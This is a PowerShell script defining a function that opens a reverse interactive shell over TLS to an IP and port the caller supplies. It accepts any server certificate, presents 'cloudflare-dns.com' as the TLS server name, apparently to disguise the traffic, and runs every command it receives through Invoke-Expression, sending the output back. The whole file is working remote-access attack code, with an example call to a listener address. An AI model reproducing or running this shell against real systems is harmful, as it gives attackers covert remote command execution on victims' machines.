function GetShell(){
<#

.SYNOPSIS
This script which can be used for Reverse interactive PowerShell from a target. 

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch.


.EXAMPLE
PS > GetShellSSL -Reverse -IPAddress 192.168.254.226 -Port 4646

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

#>

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse
    )



    do {
        Start-Sleep -Seconds 1

          # Connect to Server
        try{
            $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress,$Port)
        } catch {
            Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
            Write-Error $_
        }
    } until ($TCPClient.Connected)


    $streamNet = $TCPClient.GetStream()

    $streamSecure = New-Object Net.Security.SslStream($streamNet,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))

    $streamSecure.AuthenticateAsClient('cloudflare-dns.com',$null,$false)

    # Close the connection if the attacking machine does not use ssl connections.
    if(!$streamSecure.IsEncrypted -or !$streamSecure.IsSigned) {
        $streamSecure.Close()
        exit
    }


    $StreamWriter = New-Object IO.StreamWriter($streamSecure)

    WriteToStream ''

    while(($BytesRead = $streamSecure.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $userInput = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)

        if ($userInput -eq 'exit'){
            $streamSecure.Close()
            exit
        }
      
      
        if($userInput -ne $null){
             $Output = try {
                        Invoke-Expression $userInput 2>&1 | Out-String
                    } catch {
                        $_ | Out-String
                }
           WriteToStream ($Output)
          
        }
    }

    $StreamWriter.Close()

}

function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    $sendbytes = 'PS ' + (Get-Location).Path + '> '
    $StreamWriter.Write($String + $sendbytes)
    $StreamWriter.Flush()
}


# GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646
